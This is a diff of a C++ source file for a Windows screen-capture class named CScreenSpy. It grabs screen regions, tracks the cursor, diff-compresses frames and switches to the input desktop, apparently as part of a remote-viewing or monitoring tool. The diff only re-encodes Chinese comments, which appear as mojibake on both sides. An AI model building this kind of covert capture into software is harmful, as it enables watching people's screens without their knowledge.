@@ -1,4 +1,4 @@
-// ScreenSpy.cpp: implementation of the CScreenSpy class.
+ï»¿// ScreenSpy.cpp: implementation of the CScreenSpy class.
 //
 //////////////////////////////////////////////////////////////////////
 #include "stdafx.h"
@@ -7,7 +7,7 @@
 
 //#include "until.h"
 
-//RGB×ª»Ò¶ÈµÄËã·¨Ö®Ò»
+//RGBè½¬ç°åº¦çš„ç®—æ³•ä¹‹ä¸€
 #define RGB2GRAY(r,g,b) (((b)*117 + (g)*601 + (r)*306) >> 10)
 
 #define DEF_STEP	19
@@ -42,7 +42,7 @@ CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
 
 	m_dwBitBltRop	= SRCCOPY;
 
-	m_bAlgorithm	= ALGORITHM_SCAN; // Ä¬ÈÏÊ¹ÓÃ¸ôĞĞÉ¨ÃèËã·¨
+	m_bAlgorithm	= ALGORITHM_SCAN; // é»˜è®¤ä½¿ç”¨éš”è¡Œæ‰«æç®—æ³•
 	m_dwLastCapture	= GetTickCount();
 	m_nMaxFrameRate	= nMaxFrameRate;
 	m_dwSleep		= 1000 / nMaxFrameRate;
@@ -77,7 +77,7 @@ CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
 	
 	::SetRect(&m_changeRect, 0, 0, m_nFullWidth, m_nFullHeight);
 
-	// ×ã¹»ÁË
+	// è¶³å¤Ÿäº†
 	m_rectBuffer = new BYTE[m_lpbmi_full->bmiHeader.biSizeImage * 2];
 	m_nDataSizePerLine = m_lpbmi_full->bmiHeader.biSizeImage / m_nFullHeight;
 
@@ -112,33 +112,33 @@ LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
 
 	SelectInputWinStation();
 
-	// ÖØÖÃrect»º³åÇøÖ¸Õë
+	// é‡ç½®rectç¼“å†²åŒºæŒ‡é’ˆ
 	m_rectBufferOffset = 0;
 
-	// Ğ´ÈëÊ¹ÓÃÁËÄÄÖÖËã·¨
+	// å†™å…¥ä½¿ç”¨äº†å“ªç§ç®—æ³•
 	WriteRectBuffer((LPBYTE)&m_bAlgorithm, sizeof(m_bAlgorithm));
 
-	// Ğ´Èë¹â±êÎ»ÖÃ
+	// å†™å…¥å…‰æ ‡ä½ç½®
 	POINT	CursorPos;
 	GetCursorPos(&CursorPos);
 	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));
 	
-	// Ğ´Èëµ±Ç°¹â±êÀàĞÍ
+	// å†™å…¥å½“å‰å…‰æ ‡ç±»å‹
 	BYTE	bCursorIndex = m_CursorInfo.getCurrentCursorIndex();
 	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));
 
-	// ²îÒì±È½ÏËã·¨
+	// å·®å¼‚æ¯”è¾ƒç®—æ³•
 	if (m_bAlgorithm == ALGORITHM_DIFF)
 	{
-		// ·Ö¶ÎÉ¨ÃèÈ«ÆÁÄ»
+		// åˆ†æ®µæ‰«æå…¨å±å¹•
 		ScanScreen(m_hDiffMemDC, m_hFullDC, m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight);
 		*lpdwBytes = m_rectBufferOffset + 
 			Compare((LPBYTE)m_lpvDiffBits, (LPBYTE)m_lpvFullBits, m_rectBuffer + m_rectBufferOffset, m_lpbmi_full->bmiHeader.biSizeImage);
 		return m_rectBuffer;
 	}
 
-	// Êó±êÎ»ÖÃ·¢±ä»¯²¢ÇÒÈÈµãÇøÓòÈç¹û·¢Éú±ä»¯£¬ÒÔ(·¢Éú±ä»¯µÄĞĞ + DEF_STEP)ÏòÏÂÉ¨Ãè
-	// ÏòÉÏÌá
+	// é¼ æ ‡ä½ç½®å‘å˜åŒ–å¹¶ä¸”çƒ­ç‚¹åŒºåŸŸå¦‚æœå‘ç”Ÿå˜åŒ–ï¼Œä»¥(å‘ç”Ÿå˜åŒ–çš„è¡Œ + DEF_STEP)å‘ä¸‹æ‰«æ
+	// å‘ä¸Šæ
 	int	nHotspot = max(0, CursorPos.y - DEF_STEP);
 	for (
 		int i = ((CursorPos.y != nOldCursorPosY) && ScanChangedRect(nHotspot)) ? (nHotspot + DEF_STEP) : m_nStartLine; 
@@ -156,7 +156,7 @@ LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
 	m_nStartLine = (m_nStartLine + 3) % DEF_STEP;
 	*lpdwBytes = m_rectBufferOffset;
 
-	// ÏŞÖÆ·¢ËÍÖ¡µÄËÙ¶È
+	// é™åˆ¶å‘é€å¸§çš„é€Ÿåº¦
 	while (GetTickCount() - m_dwLastCapture < m_dwSleep)
 		Sleep(1);
 	InterlockedExchange((LPLONG)&m_dwLastCapture, GetTickCount());
@@ -169,7 +169,7 @@ bool CScreenSpy::ScanChangedRect(int nStartLine)
 	bool	bRet = false;
 	LPDWORD p1, p2;
 	::BitBlt(m_hLineMemDC, 0, 0, m_nFullWidth, 1, m_hFullDC, 0, nStartLine, m_dwBitBltRop);
-	// 0 ÊÇ×îºóÒ»ĞĞ
+	// 0 æ˜¯æœ€åä¸€è¡Œ
 	p1 = (PDWORD)((DWORD)m_lpvFullBits + ((m_nFullHeight - 1 - nStartLine) * m_nDataSizePerLine));
 	p2 = (PDWORD)m_lpvLineBits;
 	::SetRect(&m_changeRect, -1, nStartLine - DEF_STEP, -1, nStartLine + DEF_STEP * 2);
@@ -192,7 +192,7 @@ bool CScreenSpy::ScanChangedRect(int nStartLine)
 		m_changeRect.top    = max(m_changeRect.top, 0);
 		m_changeRect.right  = min(m_changeRect.right, m_nFullWidth);
 		m_changeRect.bottom = min(m_changeRect.bottom, m_nFullHeight);
-		// ¸´ÖÆ¸Ä±äµÄÇøÓò
+		// å¤åˆ¶æ”¹å˜çš„åŒºåŸŸ
 		CopyRect(&m_changeRect);
 		bRet = true;
 	}
@@ -207,12 +207,12 @@ void CScreenSpy::setAlgorithm(UINT nAlgorithm)
 LPBITMAPINFO CScreenSpy::ConstructBI(int biBitCount, int biWidth, int biHeight)
 {
 /*
-biBitCount Îª1 (ºÚ°×¶şÉ«Í¼) ¡¢4 (16 É«Í¼) ¡¢8 (256 É«Í¼) Ê±ÓÉÑÕÉ«±íÏîÊıÖ¸³öÑÕÉ«±í´óĞ¡
-biBitCount Îª16 (16 Î»É«Í¼) ¡¢24 (Õæ²ÊÉ«Í¼, ²»Ö§³Ö) ¡¢32 (32 Î»É«Í¼) Ê±Ã»ÓĞÑÕÉ«±í
+biBitCount ä¸º1 (é»‘ç™½äºŒè‰²å›¾) ã€4 (16 è‰²å›¾) ã€8 (256 è‰²å›¾) æ—¶ç”±é¢œè‰²è¡¨é¡¹æ•°æŒ‡å‡ºé¢œè‰²è¡¨å¤§å°
+biBitCount ä¸º16 (16 ä½è‰²å›¾) ã€24 (çœŸå½©è‰²å›¾, ä¸æ”¯æŒ) ã€32 (32 ä½è‰²å›¾) æ—¶æ²¡æœ‰é¢œè‰²è¡¨
 	*/
 	int	color_num = biBitCount <= 8 ? 1 << biBitCount : 0;
 	
-    //¼ÆËãÒ»¸öbitmapµÄ´óĞ¡
+    //è®¡ç®—ä¸€ä¸ªbitmapçš„å¤§å°
     /*
         typedef struct tagBITMAPINFO {
         BITMAPINFOHEADER bmiHeader;
@@ -235,18 +235,18 @@ biBitCount Îª16 (16 Î»É«Í¼) ¡¢24 (Õæ²ÊÉ«Í¼, ²»Ö§³Ö) ¡¢32 (32 Î»É«Í¼) Ê±Ã»ÓĞÑÕÉ«±
 	lpbmih->biClrImportant = 0;
 	lpbmih->biSizeImage = (((lpbmih->biWidth * lpbmih->biBitCount + 31) & ~31) >> 3) * lpbmih->biHeight;
 	
-	// 16Î»ºÍÒÔºóµÄÃ»ÓĞÑÕÉ«±í£¬Ö±½Ó·µ»Ø
+	// 16ä½å’Œä»¥åçš„æ²¡æœ‰é¢œè‰²è¡¨ï¼Œç›´æ¥è¿”å›
 	if (biBitCount >= 16)
 		return lpbmi;
 	/*
-	Windows 95ºÍWindows 98£ºÈç¹ûlpvBits²ÎÊıÎªNULL²¢ÇÒGetDIBits³É¹¦µØÌî³äÁËBITMAPINFO½á¹¹£¬ÄÇÃ´·µ»ØÖµÎªÎ»Í¼ÖĞ×Ü¹²µÄÉ¨ÃèÏßÊı¡£
+	Windows 95å’ŒWindows 98ï¼šå¦‚æœlpvBitså‚æ•°ä¸ºNULLå¹¶ä¸”GetDIBitsæˆåŠŸåœ°å¡«å……äº†BITMAPINFOç»“æ„ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¸ºä½å›¾ä¸­æ€»å…±çš„æ‰«æçº¿æ•°ã€‚
 	
-    Windows NT£ºÈç¹ûlpvBits²ÎÊıÎªNULL²¢ÇÒGetDIBits³É¹¦µØÌî³äÁËBITMAPINFO½á¹¹£¬ÄÇÃ´·µ»ØÖµÎª·Ç0¡£Èç¹ûº¯ÊıÖ´ĞĞÊ§°Ü£¬ÄÇÃ´½«·µ»Ø0Öµ¡£Windows NT£ºÈôÏë»ñµÃ¸ü¶à´íÎóĞÅÏ¢£¬Çëµ÷ÓÃcallGetLastErrorº¯Êı¡£
+    Windows NTï¼šå¦‚æœlpvBitså‚æ•°ä¸ºNULLå¹¶ä¸”GetDIBitsæˆåŠŸåœ°å¡«å……äº†BITMAPINFOç»“æ„ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¸ºé0ã€‚å¦‚æœå‡½æ•°æ‰§è¡Œå¤±è´¥ï¼Œé‚£ä¹ˆå°†è¿”å›0å€¼ã€‚Windows NTï¼šè‹¥æƒ³è·å¾—æ›´å¤šé”™è¯¯ä¿¡æ¯ï¼Œè¯·è°ƒç”¨callGetLastErrorå‡½æ•°ã€‚
 	*/
 
     //If this value is NULL, GetDC retrieves the DC for the entire screen.
 	HDC	hDC = GetDC(NULL);
-	HBITMAP hBmp = CreateCompatibleBitmap(hDC, 1, 1); // ¸ß¿í²»ÄÜÎª0
+	HBITMAP hBmp = CreateCompatibleBitmap(hDC, 1, 1); // é«˜å®½ä¸èƒ½ä¸º0
 	GetDIBits(hDC, hBmp, 0, 0, NULL, lpbmi, DIB_RGB_COLORS);
 	ReleaseDC(NULL, hDC);
 	DeleteObject(hBmp);
@@ -281,7 +281,7 @@ void CScreenSpy::CopyRect( LPRECT lpRect )
 	int	nRectHeight = lpRect->bottom - lpRect->top;
 
 	LPVOID	lpvRectBits = NULL;
-	// µ÷Õûm_lpbmi_rect
+	// è°ƒæ•´m_lpbmi_rect
 	m_lpbmi_rect->bmiHeader.biWidth = nRectWidth;
 	m_lpbmi_rect->bmiHeader.biHeight = nRectHeight;
 	m_lpbmi_rect->bmiHeader.biSizeImage = (((m_lpbmi_rect->bmiHeader.biWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3) 
@@ -336,7 +336,7 @@ bool CScreenSpy::SelectInputWinStation()
 	}	
 	return bRet;	
 }
-//// µ±Ç°ÊäÈëµÄÈÈµã
+//// å½“å‰è¾“å…¥çš„çƒ­ç‚¹
 // LONG CScreenSpy::getKeyBoardHotspotY()
 // {
 // 	static	DWORD	dwCurrentThreadId = GetCurrentThreadId();
@@ -363,8 +363,8 @@ bool CScreenSpy::SelectInputWinStation()
 void CScreenSpy::ScanScreen( HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight)
 {
 	UINT	nJumpLine = 50;
-	UINT	nJumpSleep = nJumpLine / 10; // É¨Ãè¼ä¸ô
-	// É¨ÃèÆÁÄ»
+	UINT	nJumpSleep = nJumpLine / 10; // æ‰«æé—´éš”
+	// æ‰«æå±å¹•
 	int	nToJump;
 	for (int i = 0, nToJump = 0; i < nHeight; i += nToJump)
 	{
@@ -379,31 +379,31 @@ void CScreenSpy::ScanScreen( HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight)
 	}
 }
 
-// ²îÒì±È½ÏËã·¨¿éµÄº¯Êı
+// å·®å¼‚æ¯”è¾ƒç®—æ³•å—çš„å‡½æ•°
 int CScreenSpy::Compare( LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize )
 {
-	// Windows¹æ¶¨Ò»¸öÉ¨ÃèĞĞËùÕ¼µÄ×Ö½ÚÊı±ØĞëÊÇ4µÄ±¶Êı, ËùÒÔÓÃDWORD±È½Ï
+	// Windowsè§„å®šä¸€ä¸ªæ‰«æè¡Œæ‰€å çš„å­—èŠ‚æ•°å¿…é¡»æ˜¯4çš„å€æ•°, æ‰€ä»¥ç”¨DWORDæ¯”è¾ƒ
 	LPDWORD	p1, p2;
 	p1 = (LPDWORD)lpDest;
 	p2 = (LPDWORD)lpSource;
 
-	// Æ«ÒÆµÄÆ«ÒÆ£¬²»Í¬³¤¶ÈµÄÆ«ÒÆ
+	// åç§»çš„åç§»ï¼Œä¸åŒé•¿åº¦çš„åç§»
 	int	nOffsetOffset = 0, nBytesOffset = 0, nDataOffset = 0;
-	int nCount = 0; // Êı¾İ¼ÆÊıÆ÷
-	// p1++Êµ¼ÊÉÏÊÇµİÔöÁËÒ»¸öDWORD
+	int nCount = 0; // æ•°æ®è®¡æ•°å™¨
+	// p1++å®é™…ä¸Šæ˜¯é€’å¢äº†ä¸€ä¸ªDWORD
 	for (int i = 0; i < dwSize; i += 4, p1++, p2++)
 	{
 		if (*p1 == *p2)
 			continue;
-		// Ò»¸öĞÂÊı¾İ¿é¿ªÊ¼
-		// Ğ´ÈëÆ«ÒÆµØÖ·
+		// ä¸€ä¸ªæ–°æ•°æ®å—å¼€å§‹
+		// å†™å…¥åç§»åœ°å€
 		*(LPDWORD)(lpBuffer + nOffsetOffset) = i;
-		// ¼ÇÂ¼Êı¾İ´óĞ¡µÄ´æ·ÅÎ»ÖÃ
+		// è®°å½•æ•°æ®å¤§å°çš„å­˜æ”¾ä½ç½®
 		nBytesOffset = nOffsetOffset + sizeof(int);
 		nDataOffset = nBytesOffset + sizeof(int);
-		nCount = 0; // Êı¾İ¼ÆÊıÆ÷¹éÁã
+		nCount = 0; // æ•°æ®è®¡æ•°å™¨å½’é›¶
 
-		// ¸üĞÂDestÖĞµÄÊı¾İ
+		// æ›´æ–°Destä¸­çš„æ•°æ®
 		*p1 = *p2;
 		*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;
 
@@ -415,20 +415,20 @@ int CScreenSpy::Compare( LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD 
 			if (*p1 == *p2)
 				break;
 
-			// ¸üĞÂDestÖĞµÄÊı¾İ
+			// æ›´æ–°Destä¸­çš„æ•°æ®
 			*p1 = *p2;
 			*(LPDWORD)(lpBuffer + nDataOffset + nCount) = *p2;
 			nCount += 4;
 		}
-		// Ğ´ÈëÊı¾İ³¤¶È
+		// å†™å…¥æ•°æ®é•¿åº¦
 		*(LPDWORD)(lpBuffer + nBytesOffset) = nCount;
 		nOffsetOffset = nDataOffset + nCount;	
 	}
 
-	// nOffsetOffset ¾ÍÊÇĞ´ÈëµÄ×Ü´óĞ¡
+	// nOffsetOffset å°±æ˜¯å†™å…¥çš„æ€»å¤§å°
 	return nOffsetOffset;
 
-//	¸Ğ¾õ»ã±àËÙ¶È»¹Ã»ÓĞCËã·¨¿ì£¬ÓôÃÆÀ´×Å
+//	æ„Ÿè§‰æ±‡ç¼–é€Ÿåº¦è¿˜æ²¡æœ‰Cç®—æ³•å¿«ï¼Œéƒé—·æ¥ç€
 // 	int	Bytes = 0;
 // 	__asm
 // 	{
@@ -436,13 +436,13 @@ int CScreenSpy::Compare( LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD 
 // 		mov     edi, [lpDest]
 // 		mov     ebx, [lpBuffer]
 // 		xor		ecx, ecx
-// 		jmp		short Loop_Compare				// ¿ªÊ¼½øĞĞ±È½Ï
+// 		jmp		short Loop_Compare				// å¼€å§‹è¿›è¡Œæ¯”è¾ƒ
 // Loop_Compare_Continue:
 // 		mov     eax, dword ptr [esi]
 // 		cmp     eax, dword ptr [edi]
-// 		je      short Loop_Compare_Equal		// Èç¹ûÏàµÈ, ¼ÌĞø±È½Ï
-// 		mov		[edi], eax						// Ğ´Èë²»Í¬µÄÊı¾İµ½Ä¿±êÖĞ
-// 		mov     edx, ebx						// edx ¼ÇÂ¼µÚÒ»¸ö²»Í¬ÇøÓò¿éµÄÆğÊ¼Î»ÖÃ
+// 		je      short Loop_Compare_Equal		// å¦‚æœç›¸ç­‰, ç»§ç»­æ¯”è¾ƒ
+// 		mov		[edi], eax						// å†™å…¥ä¸åŒçš„æ•°æ®åˆ°ç›®æ ‡ä¸­
+// 		mov     edx, ebx						// edx è®°å½•ç¬¬ä¸€ä¸ªä¸åŒåŒºåŸŸå—çš„èµ·å§‹ä½ç½®
 // 		mov     dword ptr [ebx], ecx
 // 		add     ebx, 8
 // 		mov     dword ptr [ebx], eax
@@ -450,11 +450,11 @@ int CScreenSpy::Compare( LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD 
 // 		add     esi, 4
 // 		add     edi, 4
 // 		add     ecx, 4
-// 		jmp     short Loop_Block_Compare		// Êı¾İ²»Í¬£¬²úÉúÒ»¸öÇø¿é£¬¶ÔÕâ¸öÇø¿é½øĞĞ±È½Ï
+// 		jmp     short Loop_Block_Compare		// æ•°æ®ä¸åŒï¼Œäº§ç”Ÿä¸€ä¸ªåŒºå—ï¼Œå¯¹è¿™ä¸ªåŒºå—è¿›è¡Œæ¯”è¾ƒ
 // Loop_Block_Compare_Continue:	
 // 		mov     eax, dword ptr [esi]
 // 		cmp     eax, dword ptr [edi]
-// 		jnz     short Loop_Block_Compare_Not_Equal // Êı¾İ²»ÏàµÈ£¬Ğ´Èë
+// 		jnz     short Loop_Block_Compare_Not_Equal // æ•°æ®ä¸ç›¸ç­‰ï¼Œå†™å…¥
 // 		mov     eax, ecx
 // 		sub     eax, dword ptr [edx]
 // 		add     edx, 4
@@ -467,7 +467,7 @@ int CScreenSpy::Compare( LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD 
 // 		jmp     short Loop_Block_Compare_Finish
 // Loop_Block_Compare_Not_Equal:	
 // 		mov     dword ptr [ebx], eax
-// 		mov		[edi], eax					// Ğ´Èë²»Í¬µÄÊı¾İµ½Ä¿±êÖĞ
+// 		mov		[edi], eax					// å†™å…¥ä¸åŒçš„æ•°æ®åˆ°ç›®æ ‡ä¸­
 // 		add     ebx, 4
 // 		add     esi, 4
 // 		add     edi, 4
